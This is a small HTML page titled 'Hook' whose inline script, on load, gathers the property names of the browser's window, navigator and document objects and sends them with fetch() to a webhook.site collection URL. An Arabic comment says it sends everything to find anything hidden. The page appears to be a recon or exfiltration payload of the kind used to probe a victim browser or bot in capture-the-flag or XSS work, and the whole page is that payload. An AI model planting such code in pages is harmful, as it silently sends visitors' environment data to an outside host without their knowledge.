<html>
<head>
<title>Hook</title>
</head>
<body>

<script>
    function sendToRemote(data) {
        fetch('https://webhook.site/6111dfaf-6540-4e7c-a774-27883c7b3ea9?data=' + encodeURIComponent(JSON.stringify(data)));
    }

    let results = {
        windowProps: Object.getOwnPropertyNames(window),
        navigatorProps: Object.getOwnPropertyNames(navigator),
        documentProps: Object.getOwnPropertyNames(document)
    };

    // نرسل كل شيء لنرى ما إذا كان هناك شيء مخفي
    sendToRemote(results);
</script>

</body>
</html>
